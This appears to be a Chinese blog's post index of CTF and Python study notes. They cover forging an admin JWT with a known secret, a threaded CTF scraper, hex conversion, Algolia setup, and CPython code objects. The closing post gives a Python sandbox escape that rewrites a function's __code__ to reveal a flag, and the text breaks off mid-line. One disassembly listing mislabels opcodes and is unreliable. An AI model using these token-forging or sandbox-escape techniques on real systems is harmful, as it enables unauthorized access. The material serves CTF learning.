iknu JWT破解工具 https://github.com/brendan-rius/c-jwt-cracker JWT生成网站 https://jwt.io/ 9.生成JWT pip安装PyJWT模块来生成jwt 123&gt;&gt;&gt; import jwt&gt;&gt;&gt; jwt.encode(&#123;&#x27;username&#x27;: &#x27;admin&#x27;&#125;, &#x27;1Kun&#x27;, algorithm=&#x27;HS256&#x27;)b&#x27;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.dD2hbntzt9yS-uufk1yalEMjkvv4fo5jeP9XMeJm_f0&#x27;"},{"title":"python多线程","date":"2020-03-15","updated":"2024-03-19","path":"2020/03/15/python多线程/","text":"123456789101112131415161718192021222324252627282930313233343536from concurrent.futures import ThreadPoolExecutorimport timeimport requestsr=requests.session()def requestUrl(url): response = requests.get(url) #下载页面 if &quot;lv6.png&quot; in response.text: print(response.url) return response## 回调函数#def done(future,*args,**kwargs):# response = future.result() #取得future对象进行操作# if &quot;lv6.png&quot; in response.text:# print(response.url)#def main(): url=&quot;http://c8d9a312-36e4-442f-8d1c-b5f14a5290b9.node3.buuoj.cn/&quot; user=&#123;&quot;_xsrf&quot;:&quot;2%7Cd9aca2c4%7C141a48c4004d577321918c738b2c5968%7C1584286112&quot;,&quot;username&quot;:&quot;sa&quot;,&quot;password&quot;:&quot;sa&quot;&#125; r.post(url,data=user) seed=[ url+&quot;shop?page=&quot;+str(i) for i in range(1,500) ] # with ThreadPoolExecutor(10) as executor:# for each in seed:# executor.submit(requestUrl,each).add_done_callback(done)# print(&quot;----------------&quot;)# time.sleep(5) with ThreadPoolExecutor(max_workers=10) as executor1: executor1.map(requestUrl,seed)if __name__ == &#x27;__main__&#x27;: main()"},{"title":"phar文件无法生成","date":"2020-03-15","updated":"2024-03-19","path":"2020/03/15/phar文件无法生成/","text":"来到/etc/php/对应的版本/cli/目录下修改php.ini，设置phar.readonly =Off 还有etc/php/apache2/目录下"},{"title":"python字符串转化","date":"2020-03-14","updated":"2024-03-19","path":"2020/03/14/python字符串转化/","text":"12345678910111213141516def str_to_hex(s): return &#x27; &#x27;.join([hex(ord(c)).replace(&#x27;0x&#x27;, &#x27;&#x27;) for c in s])def hex_to_str(s): return &#x27;&#x27;.join([chr(i) for i in [int(b, 16) for b in s.split(&#x27; &#x27;)]]) def str_to_bin(s): return &#x27; &#x27;.join([bin(ord(c)).replace(&#x27;0b&#x27;, &#x27;&#x27;) for c in s]) def bin_to_str(s): return &#x27;&#x27;.join([chr(i) for i in [int(b, 2) for b in s.split(&#x27; &#x27;)]]) a=&quot;abcdef&quot;x=str_to_hex(a)print(x)print(hex_to_str(x)) 不带0x的连续十六进制字符串转换: 12345678910111213import redef hex_to_str(s): pattern = re.compile(r&#x27;[A-Z0-9]&#123;2&#125;&#x27;) return &#x27;&#x27;.join([chr(i) for i in [int(&#x27;0x&#x27;+str(b), 16) for b in pattern.findall(s) ]])#raw=&quot;&quot;#with open(&#x27;raw&#x27;,&#x27;r&#x27;) as f:# raw=f.readlines()#raw=str(raw)raw=&quot;3C3F7068700A24666C6167203D2027666C61677B66396361316136622D396437382D313165382D393061332D6334623330316237623939627D273B0A3F3E0A&quot;print(hex_to_str(raw)) 字符串转十六进制 python2 12hex = &quot;hello&quot;.encode(&#x27;hex&#x27;)print hex python3 在python3中，hex编解码器被废弃。改用binascii 123import binasciihex = binascii.hexlify(b&#x27;hello&#x27;)print(hex) 十六进制转字符串 python2 12hex = &quot;68656c6c6f&quot;print hex.decode(&#x27;hex&#x27;) python3 方法一 1234import binasciihex = b&#x27;68656c6c6f&#x27;s = binascii.unhexlify(hex)print(s) 如果需要去除字节前缀b，（参考python去掉空格和 b - effortsing - 博客园 ）只需 1print(str(binascii.unhexlify(hex)).strip(&#x27;b&#x27;)) 方法二 这种方法参考Python内置进制转换函数(实现16进制和ASCII转换) - 村口王铁匠 - 博客园 123hex = &quot;68656c6c6f&quot;for i in range(0, len(hex), 2): print(chr(int(hex[i:i+2], 16)),end=&quot;&quot;) 关于废弃encode使用binascii参考了stackoverflow： How to use the ‘hex’ encoding in Python 3.2 or higher? - Stack Overflow hex - python encode() - Stack Overflow"},{"title":"Hexo博客增加algolia搜索功能","date":"2020-03-13","updated":"2024-03-19","path":"2020/03/13/Hexo博客增加algolia搜索功能/","text":"准备工作 首先你要有一个 Hexo 博客，我配置时的版本是 Hexo v3.9.0 和 NexT.Pisces v7.6.0。 第一步、新建 Algolia 账号 我直接 Github 登录的，然而还是非得填完手机号地址公司名之类的不可，一路 next 到让你建立 index 才算注册完成。 第二步、新建 index 取名 取什么随便，但要记住这个名字，后面要用。 第三步、新建一个 API Key 重点来了 那个什么「Search-Only API Key」，忘了它吧。我们直接新建一个 API Key。 新建API Key 右上角「New API Key」，然后设置，除了第一行是描述，其他行都是「空着不填 = 无限制」，直接看最后一行。 修改访问控制列表 这个 Key 就是你的「API Key」。 也就是 Hexo 的 _config.yml 里填的 apiKey，一会设置的环境变量 HEXO_ALGOLIA_INDEXING_KEY，都是它。 第四步、配置 Hexo 编辑 Hexo 的配置文件 _config.yml，新增 123456algolia: applicationID: &#x27;你在 algolia 的 Application ID&#x27; apiKey: &#x27;第三步里新建的 API Key&#x27; adminApiKey: &#x27;你在 algolia 的 Admin API Key&#x27; indexName: &#x27;第二步里新建的 index 名字&#x27; chunkSize: 5000 第五步、安装 &amp; 配置 &amp; 运行 hexo-algolia 打开一个 Bash，推荐 Git，运行 12$ npm install --save hexo-algolia$ set HEXO_ALGOLIA_INDEXING_KEY=你的apiKey # 如果你不是 windows, 把 set 换成 export 这个 apiKey 就是第三步里新建的 API Key $ hexo algolia 理论上就 OK 了，成功的回显参考 12345INFO [hexo-algolia] Testing HEXO_ALGOLIA_INDEXING_KEY permissions.INFO Start processingINFO [hexo-algolia] 23 records to index (post, page).INFO [hexo-algolia] Indexing chunk 1 of 1 (23 records)INFO [hexo-algolia] Indexing done. 假如回显类似 123456INFO [hexo-algolia] Testing HEXO_ALGOLIA_INDEXING_KEY permissions.INFO Start processingINFO [hexo-algolia] 22 records to index (post, page).INFO [hexo-algolia] Indexing chunk 1 of 1 (22 records)ERROR [hexo-algolia] Not enough rights to update an object near line:1 column:630INFO [hexo-algolia] Indexing done. 请回到第三步，确认你是否照着做了。 注意，本地测试hexo a这个时候必须先hexo s把服务跑起来才可以，具体也不知道是为啥 插入吐槽 ERROR [hexo-algolia] Not enough rights to update an object near line 真的卡得我头大 搜到的教程文档基本上都是远古版本，偶尔提到了 ACL（访问控制列表），好，我知道是 ACL，那么 ACL 在哪呢 目前（19.12.12）algolia 自动生成的 Search-Only API Key 是没办法修改 ACL 的，有且只有搜索权限 必须新建一个 API Key 才能编辑 ACL 主要坑就是这个 ACL，还有就是「设定环境变量」这一步有些文档写得真的令人迷惑，后来才发现是一字不动抄的 iissnan 的文档。 https://ews.ink/develop/Enable-Algolia-Search/"},{"title":"Python代码对象code-object与__code__属性","date":"2020-03-12","updated":"2024-03-19","path":"2020/03/12/Python代码对象code-object与-code-属性/","text":"0x01概念 代码对象 code object 是一段可执行的 Python 代码在 CPython 中的内部表示。 可执行的 Python 代码包括： 函数 模块 类 生成器表达式 当你运行一段代码时，它被解析并编译成代码对象，随后被 CPython 虚拟机执行。 代码对象包含一系列直接操作虚拟机内部状态的指令。 这跟你在用 C 语言编程时是类似的，你写出人类可读的文本，然后用编译器转换成二进制形式，二进制代码（C 的机器码或者是 Python 的字节码）被 CPU（对于 C 语言来说）或者 CPython 虚拟机虚拟的 CPU 直接执行。 代码对象除了包含 指令，还提供了虚拟机运行代码所需要的一些 额外信息。 0x02探索 以下的内容是在 Python 3.7 中实验的，而且主要是针对于函数来讲。至于模块和类虽然也是通过代码对象实现的（实际上，.pyc 文件里面就存放着序列化的模块代码对象），但是代码对象的大多数特性主要和函数相关。 关于版本需要注意两点： 在 Python 2 中，函数的代码对象通过 函数.func_code 来访问；而 Python 3 中，则需要通过 函数.code 来访问。 Python 3 的代码对象增加了一个新属性 co_kwonlyargcount，对应强制关键字参数 keyword-only argument。 首先在控制台找出属于 函数.code 的所有不以双下划线开头的属性，一共有 15 个。 12345&gt;&gt;&gt; li = [i for i in dir((lambda: 0).__code__) if not i.startswith(&#x27;__&#x27;)]&gt;&gt;&gt; print(li)&gt;&gt;&gt; [&#x27;co_argcount&#x27;, &#x27;co_cellvars&#x27;, &#x27;co_code&#x27;, &#x27;co_consts&#x27;, &#x27;co_filename&#x27;, &#x27;co_firstlineno&#x27;, &#x27;co_flags&#x27;, &#x27;co_freevars&#x27;, &#x27;co_kwonlyargcount&#x27;, &#x27;co_lnotab&#x27;, &#x27;co_name&#x27;, &#x27;co_names&#x27;, &#x27;co_nlocals&#x27;, &#x27;co_stacksize&#x27;, &#x27;co_varnames&#x27;]&gt;&gt;&gt; len(li)&gt;&gt;&gt; 15 官方文档： 属性 描述 co_argcount number of arguments (not including keyword only arguments, * or ** args) co_code string of raw compiled bytecode co_cellvars tuple of names of cell variables (referenced by containing scopes) co_consts tuple of constants used in the bytecode co_filename name of file in which this code object was created co_firstlineno number of first line in Python source code co_flags bitmap of CO_* flags, read more here co_lnotab encoded mapping of line numbers to bytecode indices co_freevars tuple of names of free variables (referenced via a function’s closure) co_kwonlyargcount number of keyword only arguments (not including ** arg) co_name name with which this code object was defined co_names tuple of names of local variables co_nlocals number of local variables co_stacksize virtual machine stack space required co_varnames tuple of names of arguments and local variables 下面逐个解释： co_argcount：函数接收参数的个数，不包括 *args 和 **kwargs 以及强制关键字参数。 123456&gt;&gt;&gt; def test(a, b, c, d=1, e=2, *args, f=3, g, h=4, **kwargs):&gt;&gt;&gt; ... print(a, b, c, d, e, f, g, h, args, kwargs)&gt;&gt;&gt; ... &gt;&gt;&gt; code_obj = test.__code__&gt;&gt;&gt; code_obj.co_argcount&gt;&gt;&gt; 5 co_code：二进制格式的字节码 bytecode，以字节串 bytes 的形式存储（在 Python 2 中以 str 类型存储）。它为虚拟机提供一系列的指令。函数从第一条指令开始执行，在碰到 RETURN_VALUE 指令的时候停止执行。 其他字节码指令 bytecode instruction 请参阅官方文档： Python Bytecode Instructions 字节码中每个指令所占字节数是不一样的。 每条指令都有一个操作码 opcode，它指明了虚拟机需要进行的操作，还有一个可选的参数，这个参数是一个整数。 操作码 opcode 是单字节的整数，所以最多有 256 个不同的操作码，尽管其中很多没有被用到。 每个操作码都有名字，在 dis 模块的 dis 函数的输出中可以见到，同时它们在 opcode 标准库模块中定义。 123&gt;&gt;&gt; from opcode import opname&gt;&gt;&gt; opname&gt;&gt;&gt; [&#x27;&lt;0&gt;&#x27;, &#x27;POP_TOP&#x27;, &#x27;ROT_TWO&#x27;, &#x27;ROT_THREE&#x27;, &#x27;DUP_TOP&#x27;, &#x27;DUP_TOP_TWO&#x27;, &#x27;&lt;6&gt;&#x27;, &#x27;&lt;7&gt;&#x27;, &#x27;&lt;8&gt;&#x27;, &#x27;NOP&#x27;, &#x27;UNARY_POSITIVE&#x27;, &#x27;UNARY_NEGATIVE&#x27;, &#x27;UNARY_NOT&#x27;, &#x27;&lt;13&gt;&#x27;, &#x27;&lt;14&gt;&#x27;, &#x27;UNARY_INVERT&#x27;, &#x27;BINARY_MATRIX_MULTIPLY&#x27;, &#x27;INPLACE_MATRIX_MULTIPLY&#x27;, &#x27;&lt;18&gt;&#x27;, &#x27;BINARY_POWER&#x27;, &#x27;BINARY_MULTIPLY&#x27;, &#x27;&lt;21&gt;&#x27;, &#x27;BINARY_MODULO&#x27;, &#x27;BINARY_ADD&#x27;, &#x27;BINARY_SUBTRACT&#x27;, &#x27;BINARY_SUBSCR&#x27;, &#x27;BINARY_FLOOR_DIVIDE&#x27;, &#x27;BINARY_TRUE_DIVIDE&#x27;, &#x27;INPLACE_FLOOR_DIVIDE&#x27;, &#x27;INPLACE_TRUE_DIVIDE&#x27;, &#x27;&lt;30&gt;&#x27;, &#x27;&lt;31&gt;&#x27;, &#x27;&lt;32&gt;&#x27;, &#x27;&lt;33&gt;&#x27;, &#x27;&lt;34&gt;&#x27;, &#x27;&lt;35&gt;&#x27;, &#x27;&lt;36&gt;&#x27;, &#x27;&lt;37&gt;&#x27;, &#x27;&lt;38&gt;&#x27;, &#x27;&lt;39&gt;&#x27;, &#x27;&lt;40&gt;&#x27;, &#x27;&lt;41&gt;&#x27;, &#x27;&lt;42&gt;&#x27;, &#x27;&lt;43&gt;&#x27;, &#x27;&lt;44&gt;&#x27;, &#x27;&lt;45&gt;&#x27;, &#x27;&lt;46&gt;&#x27;, &#x27;&lt;47&gt;&#x27;, &#x27;&lt;48&gt;&#x27;, &#x27;&lt;49&gt;&#x27;, &#x27;GET_AITER&#x27;, &#x27;GET_ANEXT&#x27;, &#x27;BEFORE_ASYNC_WITH&#x27;, &#x27;&lt;53&gt;&#x27;, &#x27;&lt;54&gt;&#x27;, &#x27;INPLACE_ADD&#x27;, &#x27;INPLACE_SUBTRACT&#x27;, &#x27;INPLACE_MULTIPLY&#x27;, &#x27;&lt;58&gt;&#x27;, &#x27;INPLACE_MODULO&#x27;, &#x27;STORE_SUBSCR&#x27;, &#x27;DELETE_SUBSCR&#x27;, &#x27;BINARY_LSHIFT&#x27;, &#x27;BINARY_RSHIFT&#x27;, &#x27;BINARY_AND&#x27;, &#x27;BINARY_XOR&#x27;, &#x27;BINARY_OR&#x27;, &#x27;INPLACE_POWER&#x27;, &#x27;GET_ITER&#x27;, &#x27;GET_YIELD_FROM_ITER&#x27;, &#x27;PRINT_EXPR&#x27;, &#x27;LOAD_BUILD_CLASS&#x27;, &#x27;YIELD_FROM&#x27;, &#x27;GET_AWAITABLE&#x27;, &#x27;&lt;74&gt;&#x27;, &#x27;INPLACE_LSHIFT&#x27;, &#x27;INPLACE_RSHIFT&#x27;, &#x27;INPLACE_AND&#x27;, &#x27;INPLACE_XOR&#x27;, &#x27;INPLACE_OR&#x27;, &#x27;BREAK_LOOP&#x27;, &#x27;WITH_CLEANUP_START&#x27;, &#x27;WITH_CLEANUP_FINISH&#x27;, &#x27;RETURN_VALUE&#x27;, &#x27;IMPORT_STAR&#x27;, &#x27;SETUP_ANNOTATIONS&#x27;, &#x27;YIELD_VALUE&#x27;, &#x27;POP_BLOCK&#x27;, &#x27;END_FINALLY&#x27;, &#x27;POP_EXCEPT&#x27;, &#x27;STORE_NAME&#x27;, &#x27;DELETE_NAME&#x27;, &#x27;UNPACK_SEQUENCE&#x27;, &#x27;FOR_ITER&#x27;, &#x27;UNPACK_EX&#x27;, &#x27;STORE_ATTR&#x27;, &#x27;DELETE_ATTR&#x27;, &#x27;STORE_GLOBAL&#x27;, &#x27;DELETE_GLOBAL&#x27;, &#x27;&lt;99&gt;&#x27;, &#x27;LOAD_CONST&#x27;, &#x27;LOAD_NAME&#x27;, &#x27;BUILD_TUPLE&#x27;, &#x27;BUILD_LIST&#x27;, &#x27;BUILD_SET&#x27;, &#x27;BUILD_MAP&#x27;, &#x27;LOAD_ATTR&#x27;, &#x27;COMPARE_OP&#x27;, &#x27;IMPORT_NAME&#x27;, &#x27;IMPORT_FROM&#x27;, &#x27;JUMP_FORWARD&#x27;, &#x27;JUMP_IF_FALSE_OR_POP&#x27;, &#x27;JUMP_IF_TRUE_OR_POP&#x27;, &#x27;JUMP_ABSOLUTE&#x27;, &#x27;POP_JUMP_IF_FALSE&#x27;, &#x27;POP_JUMP_IF_TRUE&#x27;, &#x27;LOAD_GLOBAL&#x27;, &#x27;&lt;117&gt;&#x27;, &#x27;&lt;118&gt;&#x27;, &#x27;CONTINUE_LOOP&#x27;, &#x27;SETUP_LOOP&#x27;, &#x27;SETUP_EXCEPT&#x27;, &#x27;SETUP_FINALLY&#x27;, &#x27;&lt;123&gt;&#x27;, &#x27;LOAD_FAST&#x27;, &#x27;STORE_FAST&#x27;, &#x27;DELETE_FAST&#x27;, &#x27;&lt;127&gt;&#x27;, &#x27;&lt;128&gt;&#x27;, &#x27;&lt;129&gt;&#x27;, &#x27;RAISE_VARARGS&#x27;, &#x27;CALL_FUNCTION&#x27;, &#x27;MAKE_FUNCTION&#x27;, &#x27;BUILD_SLICE&#x27;, &#x27;&lt;134&gt;&#x27;, &#x27;LOAD_CLOSURE&#x27;, &#x27;LOAD_DEREF&#x27;, &#x27;STORE_DEREF&#x27;, &#x27;DELETE_DEREF&#x27;, &#x27;&lt;139&gt;&#x27;, &#x27;&lt;140&gt;&#x27;, &#x27;CALL_FUNCTION_KW&#x27;, &#x27;CALL_FUNCTION_EX&#x27;, &#x27;SETUP_WITH&#x27;, &#x27;EXTENDED_ARG&#x27;, &#x27;LIST_APPEND&#x27;, &#x27;SET_ADD&#x27;, &#x27;MAP_ADD&#x27;, &#x27;LOAD_CLASSDEREF&#x27;, &#x27;BUILD_LIST_UNPACK&#x27;, &#x27;BUILD_MAP_UNPACK&#x27;, &#x27;BUILD_MAP_UNPACK_WITH_CALL&#x27;, &#x27;BUILD_TUPLE_UNPACK&#x27;, &#x27;BUILD_SET_UNPACK&#x27;, &#x27;SETUP_ASYNC_WITH&#x27;, &#x27;FORMAT_VALUE&#x27;, &#x27;BUILD_CONST_KEY_MAP&#x27;, &#x27;BUILD_STRING&#x27;, &#x27;BUILD_TUPLE_UNPACK_WITH_CALL&#x27;, &#x27;&lt;159&gt;&#x27;, &#x27;LOAD_METHOD&#x27;, &#x27;CALL_METHOD&#x27;, &#x27;&lt;162&gt;&#x27;, &#x27;&lt;163&gt;&#x27;, &#x27;&lt;164&gt;&#x27;, &#x27;&lt;165&gt;&#x27;, &#x27;&lt;166&gt;&#x27;, &#x27;&lt;167&gt;&#x27;, &#x27;&lt;168&gt;&#x27;, &#x27;&lt;169&gt;&#x27;, &#x27;&lt;170&gt;&#x27;, &#x27;&lt;171&gt;&#x27;, &#x27;&lt;172&gt;&#x27;, &#x27;&lt;173&gt;&#x27;, &#x27;&lt;174&gt;&#x27;, &#x27;&lt;175&gt;&#x27;, &#x27;&lt;176&gt;&#x27;, &#x27;&lt;177&gt;&#x27;, &#x27;&lt;178&gt;&#x27;, &#x27;&lt;179&gt;&#x27;, &#x27;&lt;180&gt;&#x27;, &#x27;&lt;181&gt;&#x27;, &#x27;&lt;182&gt;&#x27;, &#x27;&lt;183&gt;&#x27;, &#x27;&lt;184&gt;&#x27;, &#x27;&lt;185&gt;&#x27;, &#x27;&lt;186&gt;&#x27;, &#x27;&lt;187&gt;&#x27;, &#x27;&lt;188&gt;&#x27;, &#x27;&lt;189&gt;&#x27;, &#x27;&lt;190&gt;&#x27;, &#x27;&lt;191&gt;&#x27;, &#x27;&lt;192&gt;&#x27;, &#x27;&lt;193&gt;&#x27;, &#x27;&lt;194&gt;&#x27;, &#x27;&lt;195&gt;&#x27;, &#x27;&lt;196&gt;&#x27;, &#x27;&lt;197&gt;&#x27;, &#x27;&lt;198&gt;&#x27;, &#x27;&lt;199&gt;&#x27;, &#x27;&lt;200&gt;&#x27;, &#x27;&lt;201&gt;&#x27;, &#x27;&lt;202&gt;&#x27;, &#x27;&lt;203&gt;&#x27;, &#x27;&lt;204&gt;&#x27;, &#x27;&lt;205&gt;&#x27;, &#x27;&lt;206&gt;&#x27;, &#x27;&lt;207&gt;&#x27;, &#x27;&lt;208&gt;&#x27;, &#x27;&lt;209&gt;&#x27;, &#x27;&lt;210&gt;&#x27;, &#x27;&lt;211&gt;&#x27;, &#x27;&lt;212&gt;&#x27;, &#x27;&lt;213&gt;&#x27;, &#x27;&lt;214&gt;&#x27;, &#x27;&lt;215&gt;&#x27;, &#x27;&lt;216&gt;&#x27;, &#x27;&lt;217&gt;&#x27;, &#x27;&lt;218&gt;&#x27;, &#x27;&lt;219&gt;&#x27;, &#x27;&lt;220&gt;&#x27;, &#x27;&lt;221&gt;&#x27;, &#x27;&lt;222&gt;&#x27;, &#x27;&lt;223&gt;&#x27;, &#x27;&lt;224&gt;&#x27;, &#x27;&lt;225&gt;&#x27;, &#x27;&lt;226&gt;&#x27;, &#x27;&lt;227&gt;&#x27;, &#x27;&lt;228&gt;&#x27;, &#x27;&lt;229&gt;&#x27;, &#x27;&lt;230&gt;&#x27;, &#x27;&lt;231&gt;&#x27;, &#x27;&lt;232&gt;&#x27;, &#x27;&lt;233&gt;&#x27;, &#x27;&lt;234&gt;&#x27;, &#x27;&lt;235&gt;&#x27;, &#x27;&lt;236&gt;&#x27;, &#x27;&lt;237&gt;&#x27;, &#x27;&lt;238&gt;&#x27;, &#x27;&lt;239&gt;&#x27;, &#x27;&lt;240&gt;&#x27;, &#x27;&lt;241&gt;&#x27;, &#x27;&lt;242&gt;&#x27;, &#x27;&lt;243&gt;&#x27;, &#x27;&lt;244&gt;&#x27;, &#x27;&lt;245&gt;&#x27;, &#x27;&lt;246&gt;&#x27;, &#x27;&lt;247&gt;&#x27;, &#x27;&lt;248&gt;&#x27;, &#x27;&lt;249&gt;&#x27;, &#x27;&lt;250&gt;&#x27;, &#x27;&lt;251&gt;&#x27;, &#x27;&lt;252&gt;&#x27;, &#x27;&lt;253&gt;&#x27;, &#x27;&lt;254&gt;&#x27;, &#x27;&lt;255&gt;&#x27;] 不接收参数的操作码占用一个字节，而接收参数的操作码占用三个字节，其中第二、第三个字节按照小端序 little-endian order 存储参数。如果参数无法用两个字节表示，比如说大于 65535，则会用到特殊的操作码 EXTENDED_ARG。 co_cellvars 和 co_freevars:这两个属性用来实现嵌套函数的作用域。 co_cellvars 元组里面存储着所有被嵌套函数用到的变量名。 co_freevars 元组里面存储着所有被函数使用的在闭包作用域中定义的变量名。 这些元组内的变量名均按照字母表顺序排列。 如下例子所示，a 和 c 是 f 的 cellvars、是 g 的 freevars。 123456789101112def f(a, b): c = 3 def g(): return a + c return gprint(f.__code__.co_cellvars)print(f.__code__.co_consts[2].co_freevars)&quot;&quot;&quot;(&#x27;a&#x27;, &#x27;c&#x27;)(&#x27;a&#x27;, &#x27;c&#x27;)&quot;&quot;&quot; co_consts：在函数中用到的所有常量，比如整数、字符串、布尔值等等。它会被 LOAD_CONST 操作码使用，该操作码需要一个索引值作为参数，指明需要从 co_consts 元组中加载哪一个元素。 co_consts 元组的第一个元素是函数的文档字符串 docstring，如果没有则为 None。 co_filename：代码对象所在的文件名。 test.py 12345f = lambda: 0print(f.__code__.co_filename)&quot;&quot;&quot;test.py&quot;&quot;&quot; co_firstlineno：代码对象的第一行位于所在文件的行号。 1234567# commentf = lambda: 0print(f.__code__.co_firstlineno)&quot;&quot;&quot;3&quot;&quot;&quot; co_flags：这是一个整数，存放着函数的组合布尔标志位。 可以在 inspect 模块的文档中查看这些标志位的具体含义：Code Objects Bit Flags co_lnotab：这个属性是 line number table 行号表的缩写。它以字节串 bytes 的形式存储，每两个字节是一对，分别是 co_code 字节串的偏移量和 Python 行号的偏移量。 具体参阅：lnotab_notes.txt co_kwonlyargcount：存放强制关键字参数的个数。在 Python 2 中则没有这个属性。 123456&gt;&gt;&gt; def test(a, b, c, d=1, e=2, *args, f=3, g, h=4, **kwargs):&gt;&gt;&gt; ... print(a, b, c, d, e, f, g, h, args, kwargs)&gt;&gt;&gt; ... &gt;&gt;&gt; code_obj = test.__code__&gt;&gt;&gt; code_obj.co_kwonlyargcount&gt;&gt;&gt; 3 co_name：是与代码对象关联的对象的名字。 1234567&gt;&gt;&gt; func = lambda: 0&gt;&gt;&gt; func.__code__.co_name&gt;&gt;&gt; &#x27;&lt;lambda&gt;&#x27;&gt;&gt;&gt; def test(): pass&gt;&gt;&gt; ... &gt;&gt;&gt; test.__code__.co_name&gt;&gt;&gt; &#x27;test&#x27; co_names：该属性是由字符串组成的元组，里面按照使用顺序存放了全局变量和被导入的名字。（注意官方文档的表格中说是局部变量的名字，实际上是不对的） 1234567891011a = 1def f(x): x = a print(&#x27;hello&#x27;)print(f.__code__.co_names)&quot;&quot;&quot;(&#x27;a&#x27;, &#x27;print&#x27;)&quot;&quot;&quot; co_nlocals：函数中局部变量的个数，相当于是 co_varnames 的长度。 co_stacksize：一个整数，代表函数会使用的最大栈空间。 co_varnames：函数所有的局部变量名称（包括函数参数）组成的元组。 首先是位置参数、默认参数和强制关键字参数 然后是 *args 和 **kwargs（如果有的话） 最后是按照第一次使用顺序排列的其他局部变量。 1234567&gt;&gt;&gt; def test(a, b, c, d=1, e=2, *args, f=3, g, h=4, **kwargs):&gt;&gt;&gt; ... print(a, b, c, d, e, f, g, h, args, kwargs)&gt;&gt;&gt; ... x = 666&gt;&gt;&gt; ... &gt;&gt;&gt; code_obj = test.__code__&gt;&gt;&gt; code_obj.co_varnames&gt;&gt;&gt; (&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;d&#x27;, &#x27;e&#x27;, &#x27;f&#x27;, &#x27;g&#x27;, &#x27;h&#x27;, &#x27;args&#x27;, &#x27;kwargs&#x27;, &#x27;x&#x27;)"},{"title":"Python-Opcode及利用Opcode绕过python沙箱","date":"2020-03-12","updated":"2024-03-19","path":"2020/03/12/Python-Opcode及利用Opcode绕过python沙箱/","text":"0x01 OpCode opcode又称为操作码，是将python源代码进行编译之后的结果，python虚拟机无法直接执行human-readable的源代码，因此python编译器第一步先将源代码进行编译，以此得到opcode。例如在执行python程序时一般会先生成一个pyc文件，pyc文件就是编译后的结果，其中含有opcode序列。 如何查看一个函数的OpCode? 12345def a(): if 1 == 2: print(&quot;flag&#123;****&#125;&quot;)print &quot;Opcode of a():&quot;,a.__code__.co_code.encode(&#x27;hex&#x27;) 通过此方法我们可以得到a函数的OpCode co_code string of raw compiled bytecode Opcode of a(): 6401006402006b020072140064030047486e000064000053 我们可以通过dis库获得相应的解析结果。 123import disdis.dis(&#x27;6401006402006b020072140064030047486e000064000053&#x27;.decode(&#x27;hex&#x27;)) 得到反编译的结果 12345678910&gt; 0 LOAD_CONST 1 (1)&gt; 3 LOAD_CONST 2 (2)&gt; 6 COMPARE_OP 2 (==)&gt; 9 POP_JUMP_IF_FALSE 20&gt; 12 LOAD_CONST 3 (3)&gt; 15 LOAD_BUILD_CLASS&gt; 16 YIELD_FROM &gt; 17 JUMP_FORWARD 0 (to 20)&gt; \\&gt;&gt; 20 LOAD_CONST 0 (0)&gt; 23 RETURN_VALUE 常见的字节码指令 为了进一步研究OpCode，我们可以对dis的disassemble_string函数进行patch 在124行加入 1print hex(op).ljust(6), 可以查看具体的字节码。 1234567891011&gt; 0 LOAD_CONST 0x64 1 (1)&gt; 3 LOAD_CONST 0x64 2 (2)&gt; 6 COMPARE_OP 0x6b 2 (==)&gt; 9 POP_JUMP_IF_FALSE 0x72 20&gt; 12 LOAD_CONST 0x64 3 (3)&gt; 15 LOAD_BUILD_CLASS 0x47 &gt; 16 YIELD_FROM 0x48 &gt; 17 JUMP_FORWARD 0x6e 0 (to 20)&gt; \\&gt;&gt; 20 LOAD_CONST 0x64 0 (0)&gt; 23 RETURN_VALUE 0x53&gt; 变量 指令名 操作 LOAD_GLOBAL 读取全局变量 STORE_GLOBAL 给全局变量赋值 LOAD_FAST 读取局部变量 STORE_FAST 给局部变量赋值 LOAD_CONST 读取常量 IF 指令名 操作 POP_JUMP_IF_FALSE 当条件为假的时候跳转 JUMP_FORWARD 直接跳转 CMP_OP 1cmp_op = (&#x27;&lt;&#x27;, &#x27;&lt;=&#x27;, &#x27;==&#x27;, &#x27;!=&#x27;, &#x27;&gt;&#x27;, &#x27;&gt;=&#x27;, &#x27;in&#x27;, &#x27;not in&#x27;, &#x27;is&#x27;,&#x27;is not&#x27;, &#x27;exception match&#x27;, &#x27;BAD&#x27;) 其余的指令参考OpCode源码 0x02 利用OpCode改变程序运行逻辑 在Python中，我们可以对任意函数的__code__参数进行赋值，通过对其进行赋值，我们可以改变程序运行逻辑。 Example1 123def a(): if 1 == 2: print(&quot;flag&#123;****&#125;&quot;) 在沙箱环境中我们需要调用这个函数，但是此函数我们无法执行到print语句。因此我们需要通过某种方法得到flag Solution 1 我们直接获取a.code.co_consts，查看所有的常量。即可知道flag 1(None, 1, 2, &#x27;flag&#123;****&#125;&#x27;) Solution 2 更改程序运行逻辑 CodeType构造函数 123def __init__(self, argcount, nlocals, stacksize, flags, code, consts, names, varnames, filename, name, firstlineno, lnotab, freevars=None, cellvars=None): 上述函数其余参数均可通过__code.__.co_xxx获得 因此我们 123456def a(): if 1 == 2: print(&quot;flag&#123;****&#125;&quot;)for name in dir(a.__code__): print name,getattr(a.__code__,name) 输出 123456789101112131415&gt; co_argcount 0&gt; co_cellvars ()&gt; co_code ddkrdGHndS&gt; co_consts (None, 1, 2, &#x27;flag&#123;****&#125;&#x27;)&gt; co_filename example1.py&gt; co_firstlineno 1&gt; co_flags 67&gt; co_freevars ()&gt; co_lnotab&gt;&gt; co_name a&gt; co_names ()&gt; co_nlocals 0&gt; co_stacksize 2&gt; co_varnames () 构造相应目标代码 12345def a(): if 1 != 2: print(&quot;flag&#123;****&#125;&quot;)print &quot;Opcode of a():&quot;,a.__code__.co_code.encode(&#x27;hex&#x27;) 得到code 6401006402006b030072140064030047486e000064000053 构造payload 12345678910def a(): if 1 == 2: print(&quot;flag&#123;****&#125;&quot;)newcode = type(a.__code__)code = &quot;6401006402006b030072140064030047486e000064000053&quot;.decode(&#x27;hex&#x27;)code = newcode(0,0,2,67,code,(None, 1, 2, &#x27;flag&#123;****&#125;&#x27;),(),(),&quot;xxx&quot;,&quot;a&quot;,1,&quot;&quot;)a.__code__ = codea() 即可输出flag Example 2 1234567def target(flag): def printflag(): if flag == &quot;&quot;: print flag return printflagflag = target(&quot;flag&#123;*******&#125;&quot;) 这一次因为是通过变量传入参数，我们无法通过上一次读co_consts获得变量。但是我们这次依旧可以通过重写code获得flag。 构造替代函数 123456789def target(flag): def printflag(): if flag != &quot;&quot;: print flag return printflaga = 